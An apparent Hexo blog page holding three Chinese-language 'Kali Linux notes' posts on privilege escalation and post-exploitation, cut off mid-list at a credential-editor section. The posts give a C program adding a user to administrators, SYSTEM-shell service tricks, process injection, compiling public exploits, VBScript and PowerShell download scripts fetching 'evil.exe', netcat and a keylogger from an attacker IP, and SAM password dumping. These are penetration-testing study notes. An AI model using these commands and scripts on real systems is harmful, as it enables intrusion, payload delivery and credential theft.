<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;2&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/22/Kali%20Linnx%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(三十二)：配置不当提权</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T20:58:11+08:00">
                2019-12-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>利用配置不当提权</p>
<ul>
<li>与漏洞提权相比更常用的方法<ul>
<li>企业环境</li>
<li>补丁更新的全部已经安装（有一定的安装策略）</li>
<li>输入变量过滤之外更值得研发关注的安全隐患</li>
<li>以system权限启动（查看system权限执行的服务）</li>
<li>NTFS权限允许users修改删除</li>
</ul>
</li>
</ul>
</li>
<li><p>利用配置不当提权</p>
<ul>
<li>icacls<ul>
<li>icacls 文件（查看文件NTFS权限）</li>
<li><strong><code>🔺命令：icacls c:\windows\*.exe /save perm（文件名） /T</code></strong>（所有满足条件的文件）</li>
<li><strong><code>🔺命令：i686-w64-mingw32-gcc -o admin.exe admin.c</code></strong></li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int i;</span><br><span class="line">  i=system(&quot;net localgroup administrators a add/&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>BU：基本用户（若存在权限为FA，即为所要找的文件）
PU：普通用户
BA：管理员账户</code></pre></blockquote>
<ul>
<li>Window2 2003<ul>
<li><strong><code>🔺命令：net user a /add</code></strong></li>
<li><strong><code>🔺命令：net user a</code></strong></li>
<li>CamView添加user完全控制文件</li>
<li>拷贝到admin.exe到软件运行目录下，修改名称为原来执行文件的名称</li>
<li>删除原来执行文件或者改名</li>
</ul>
</li>
<li>Find<ul>
<li><strong><code>🔺命令：find / -perm 777 -exec ls -l {}（前面所搜到的结果） \;</code></strong></li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81)%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81)%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(三十)：本地提权（WINDOWS）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-17T20:06:10+08:00">
                2019-12-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>本地提权</p>
<ul>
<li>已实现本地低权限账号登录<ul>
<li>远程溢出</li>
<li>直接获得账号密码</li>
</ul>
</li>
<li>希望获取更高权限<ul>
<li>实现对目标进一步控制</li>
</ul>
</li>
</ul>
</li>
<li><p>本地提权</p>
<ul>
<li>系统账号之间权限隔离（系统账号和应用程序账号）<ul>
<li>操作系统安全的基础</li>
<li>用户空间</li>
<li>内核空间</li>
</ul>
</li>
<li>系统账号<ul>
<li>用户账号登陆时获取权限令牌（每次生成的令牌都有随机数）</li>
<li>服务账号无需用户登陆已在后台启动服务</li>
</ul>
</li>
</ul>
</li>
<li><p>本地提权</p>
<ul>
<li>Windows<ul>
<li>User</li>
<li>Administrator</li>
<li>System（启动运行系统内核级别的权限，真正有最大权限的账号）</li>
</ul>
</li>
<li>Linux<ul>
<li>User</li>
<li>Root</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>Windows下，User权限包含在Administrator，System有Administrator所没有的权限，Administrator有System所没有的权限</code></pre></blockquote>
<ol start="5">
<li><p>ADMIN提权为SYSTEM</p>
<ul>
<li>Windows system账号<ul>
<li>系统设置管理功能</li>
<li>SysInternal Suit</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<p>   <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/</a><br>   psexec.exe -i -s -d taskmgr<br>   psexec.exe -i -s cmd<br>   需要一个whoami的工具，需要放到Window下的System32根目录下</p>
</blockquote>
<ul>
<li>Windows XP下   <ul>
<li><strong><code>🔺命令：at 稍后的时间 /interactive cmd</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>在Windows XP下：
切换权限：taskmgr → explorer（图形化kill）→ 文件 → explorer</code></pre></blockquote>
<ul>
<li>Windows 7 or 8下 ▲ 2019.12.17 [SC] OpenSCManager失败：5<ul>
<li><strong><code>🔺命令：sc Create syscmd（服务名称） binPath=&quot;cmd /K start&quot; type=own type=interact</code></strong></li>
<li><strong><code>🔺命令：sc start syscmd</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>在Windows 7 or 8下：
service.msc，创建System服务进程
需要一个whoami的工具，需要放到Window下的System32根目录下</code></pre></blockquote>
<blockquote>
<pre><code>HelpAssistant账号为远程协助账号，允许别人的远程连接
图形化界面：我的电脑 → 计算机管理 → 本地用户和组 → 用户/组
修改密码：net user 用户名 *
查看账号：net user
查看账户权限：net user 账号名称（关注所属组）</code></pre></blockquote>
<ol start="6">
<li><p>注入进程提权</p>
<ul>
<li>隐蔽痕迹</li>
<li><strong><code>🔺命令：pinjector.exe</code></strong><ul>
<li><a href="http://www.tarasco.org/security/Process_Injector" target="_blank" rel="noopener">http://www.tarasco.org/security/Process_Injector</a></li>
</ul>
</li>
<li><strong><code>🔺命令：pinjector.exe -p PID的值 cmd 指定端口</code></strong>  </li>
</ul>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/" itemprop="url">Kali Linux笔记(二十九)：后漏洞利用阶段</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-17T20:05:52+08:00">
                2019-12-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>选择和修改EXP</p>
<ul>
<li>网上公开的EXP代码<ul>
<li>选择可信赖的EXP源（存在恶意黑客编造假的EXP，因为Shellcode都是十六进制）</li>
<li>Exploit-db（官方维护的漏洞溢出代码库）</li>
<li>SecurityFocus</li>
<li>Searchsploit</li>
<li>有能力修改EXP（Python、Perl、Ruby、C、C++….）</li>
</ul>
</li>
</ul>
</li>
<li><p>选择和修改EXP</p>
<ul>
<li>646.c<ul>
<li>类Unix环境下编译</li>
<li>返回地址与我们的环境不止</li>
<li>反弹shell硬编码了回连IP地址</li>
<li>缓冲区偏移量与我们环境不符</li>
<li>目标IP硬编码</li>
</ul>
</li>
<li>646.c<ul>
<li>Windows环境下编译</li>
<li><strong><code>🔺命令：apt-get install mingw32 ▲ 2019.12.16 更改为apt-get install mingw-w64</code></strong></li>
<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong></li>
<li><strong><code>🔺命令：i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe</code></strong> ▲ 2019.12.16 更改为 i686-w64-mingw32-gcc 646.c -o s1.exe -lws2_32</li>
<li><strong><code>🔺命令：wine sl.exe IP地址</code></strong></li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>exploit脚本路径：/usr/share/exploitdb/exploits/windows/remote</code></pre></blockquote>
<ul>
<li>643.c<ul>
<li>Linux环境下编译</li>
<li><strong><code>🔺命令：gcc 643.c -o 643</code></strong></li>
<li>Shellcode，偏移量，IP地址需要被替换</li>
</ul>
</li>
</ul>
<ol start="3">
<li><p>避免有害的EXP</p>
<ul>
<li>不同的EXP<ul>
<li>不同的系统补丁</li>
<li>软件版本</li>
<li>不同的offset、Shellcode</li>
</ul>
</li>
<li>扫描探测目标系统版本，搭建适当的测试环境<ul>
<li>避免一锤子测试</li>
</ul>
</li>
<li>修改公开的EXP满足不同环境需要<ul>
<li>了解漏洞原理，修改溢出代码</li>
</ul>
</li>
</ul>
</li>
<li><p>后漏洞利用阶段（POST EXPLOITATION）</p>
<ul>
<li>上传工具（更好控制服务器）</li>
<li>提权</li>
<li>擦除攻击痕迹</li>
<li>安装后门（进行长期的控制）<ul>
<li>长期控制</li>
<li>Dump密码</li>
<li>内网渗透</li>
</ul>
</li>
<li>后漏洞利用阶段<ul>
<li>最大的挑战–防病毒软件（信息库进行匹配，软件会更新）</li>
<li>使用合法远程控制软件</li>
</ul>
</li>
</ul>
</li>
<li><p>漏洞利用后阶段</p>
<ul>
<li>上传文件<ul>
<li>持久控制</li>
<li>扩大对目标系统的控制能力</li>
</ul>
</li>
<li>Linux系统<ul>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ul>
</li>
<li>Windows<ul>
<li>缺少预装的下载工具</li>
</ul>
</li>
</ul>
</li>
<li><p>漏洞利用后阶段</p>
<ul>
<li>非交互式shell<ul>
<li>类NC远程控制shell</li>
<li>ftp 192.168.1.1（无法进行交互）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>nc监听下来的shell与本机的shell存在不同
window xp安装ftp：appwiz.cpl → Add → IIS → FTP（可能需要安装光盘）</code></pre></blockquote>
<ol start="7">
<li><p>使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）</p>
<ul>
<li>XP、2003默认安装</li>
<li>Win7、2008需要单独添加（作为操作系统组件单独添加）</li>
<li>经常被边界防火墙过滤</li>
<li>Kali<ul>
<li><strong><code>🔺命令：mkdir /tftp</code></strong></li>
<li><strong><code>🔺命令：chown -R nobody /tftp</code></strong>（作为服务程序的权限，较低）</li>
<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /tftp/</code></strong>（拷贝需要上传文件）</li>
<li><strong><code>🔺命令：atftpd --daemon --port 69 /tftp</code></strong>（作为后端程序）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>需要把tftpd下所有文件，组属设置为nobody，才能被下载</code></pre></blockquote>
<ul>
<li>Windows<ul>
<li><strong><code>🔺命令：tftp -i IP地址 get nc.exe</code></strong>  </li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>tasklist查看Window运行的进程（exe）
klogger.exe记录键盘敲击的字符</code></pre></blockquote>
<ol start="8">
<li><p>利用FTP传输文件</p>
<ul>
<li>Kali<ul>
<li><strong><code>🔺命令：apt-get install pure-ftpd</code></strong></li>
<li><strong><code>🔺命令：./ftp.sh</code></strong>（ftp配置文件）</li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">groupadd ftpgroup</span><br><span class="line">useradd -g ftpgroup -d /dev/null -s /etc ftpuser</span><br><span class="line">pure-pw useradd yuanfh -u ftpuser -d /ftphome</span><br><span class="line">pure-pw mkdb</span><br><span class="line">cd /etc/pure-ftpd/auth/</span><br><span class="line">ln -s ../conf/PureDB 60pdb</span><br><span class="line">mkdir -p /ftphome</span><br><span class="line">chown -R ftpuser:ftpgroup /ftphome/</span><br><span class="line">/etc/init.d/pure-ftpd restart</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows<ul>
<li><strong><code>🔺命令：echo open IP地址 21&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo 用户&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo 密码&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo bin&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo GET whoami.exe&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo GET klogger.exe&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：echo bye&gt;&gt;ftp.txt</code></strong></li>
<li><strong><code>🔺命令：ftp -s:ftp.txt</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>需要拷贝要上传的文件到ftp server的根目录下</code></pre></blockquote>
<ol start="9">
<li><p>使用VBSCRIPT传输文件</p>
<ul>
<li>Kali<ul>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cd /var/www/html/</code></strong></li>
<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
</ul>
</li>
<li>Windows<ul>
<li>wget.vbs ▲ 2019.12.17 XP系统报错：Microsoft VBScript runtime error下标越界</li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreatObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreatObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting,FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True)&gt;&gt;wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffter = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter+1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows  <ul>
<li><strong><code>🔺命令：cscript wget.vbs http://IP地址/whoami.exe w.exe</code></strong></li>
</ul>
</li>
</ul>
<ol start="10">
<li><p>使用POWERSHELL传输文件</p>
<ul>
<li>Kali <ul>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cd /var/www/html/</code></strong></li>
<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
</ul>
</li>
<li>Windows<ul>
<li>Wget.ps1 ▲2019.12.17报错：webclient.DownloadFile($url,$file)请求期间发生异常</li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$storageDir = $pwd</span><br><span class="line">$webclient = New-Object System.Net.WebClient</span><br><span class="line">$url = &quot;http://IP地址/evil.exe&quot;</span><br><span class="line">$file = &quot;new-exploit.exe&quot;</span><br><span class="line">$webclient.DownloadFile($url,$file)</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows<ul>
<li><strong><code>🔺命令：powershell.exe -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File Wget.ps1</code></strong></li>
</ul>
</li>
</ul>
<ol start="11">
<li><p>使用DEBUG传输文件</p>
<ul>
<li>Debug（Windows3.1就有Debug这个命令）<ul>
<li>汇编、反汇编</li>
<li>16进制dump</li>
<li>默认限制文本文件64K字节</li>
</ul>
</li>
<li>upx压缩文件（对传输文件进行压缩，在Kali下压缩）</li>
<li><strong><code>🔺命令：wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt</code></strong></li>
<li><strong><code>🔺命令：debug&lt;123.hex</code></strong>  </li>
<li><strong><code>🔺命令：copy 1.dll nc.exe</code></strong></li>
</ul>
</li>
<li><p>抓包嗅探（只能抓请求本地服务的身份验证）</p>
<ul>
<li>Windows<ul>
<li>Wireshark</li>
<li>Omnipeek（图形化界面好，功能全）</li>
<li>commview</li>
<li>Sniffpass（只抓有密码的包，无论有无错密码，都会抓包）</li>
</ul>
</li>
<li>Linux<ul>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniff（只抓密码的程序）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<p>   dsniff -h<br>   dsniff -i eth0</p>
</blockquote>
<ol start="13">
<li><p>键盘记录</p>
<ul>
<li>Keylogger（记录所有的键盘敲击）</li>
<li>木马窃取（DarkComet-RAT）</li>
</ul>
</li>
<li><p>本地缓存密码</p>
<ul>
<li>浏览器缓存的密码<ul>
<li>IE</li>
<li>Firefox</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>Firefox：浏览器记住的密码：Preferences → Security → saved Logins → Show Passwords
IE：Internet选项 → 内容 → 自动完成设置 → 管理密码
Window7：运行 → appwiz.cpl → 控制面板 → 用户 → 凭据管理器</code></pre></blockquote>
<ul>
<li>网络密码</li>
<li>无线密码</li>
<li><a href="http://www.nirsoft.net（集成工具）" target="_blank" rel="noopener">http://www.nirsoft.net（集成工具）</a></li>
</ul>
<blockquote>
<pre><code>Remote Desktop PassView 远程桌面显示，对rdp文件进行读取</code></pre></blockquote>
<ul>
<li>Dump SAM<ul>
<li>Pwdump（可远程执行，需要IP，用户以及密码）</li>
<li>/usr/share/windows-binaries/fgdump</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>操作系统不保存密码，只保存密码的哈希值，输入登陆密码的时候，操作系统组件会对输入的密码进行哈希运算，比对密码数据库的哈希值
操作系统保存哈希值，有两个值，一个是LMHash，另一个是NTLMHash
本地密码数据库：C：\WINDOWS\system32\config\SAM</code></pre></blockquote>
<ul>
<li>Dump SAM<ul>
<li>PwDump.exe -h  </li>
<li>PwDump.exe  -x localhost ▲ 2019.12.18对于64bit的操作系统，需要加-x参数</li>
<li>保存搜到的文件上传Kali</li>
</ul>
</li>
<li>ophcrack<ul>
<li>load pwdump文件</li>
</ul>
</li>
</ul>
<ol start="15">
<li>WINDOWS身份认证过程</li>
</ol>
<blockquote>
<pre><code>身份验证组件：
Windows NT Logon and Authentication Model
WINLOGON.EXE → LAS AUTH API(LSASRV.DLL) → MSV1_0.DDL(NTLM AUTH PKG)

身份验证方式：
Localhost:
明文cgarcia/密文pwd1 → h1=LMHash(&quot;pwd1&quot;)/h2=NTHash(&quot;pwd1&quot;) → cmp([h1,h2],SAM) → SAM DATABASE
Network:
1.The cleartxt password is not sent
2.The NTLM protocol is used

身份验证具体步骤：
发送方
1.cgarcia/pwd1
2.lmhash=LMHash(&quot;pwd1&quot;)/nthash=NTHash(&quot;pwd2&quot;)
3.Init connection
5.R=f(lmhash/nthash,C)
6.Sends cgarcia,R
接受方
4.Responds C=challenge random
7.R&apos;=f(SAM[lmhash/nthash],C)
8.R&apos;== R &gt;&gt;Access Grant/R&apos;&lt;&gt; R&gt;&gt;Access Denied(SAM Database)</code></pre></blockquote>
<ol start="16">
<li><p>WCE（WINDOWS CREDENTIAL EDITOR）</p>
<ul>
<li>/usr/share/windows-resources/wce（wce32.exe/wce64.exe/wce-universal.exe）</li>
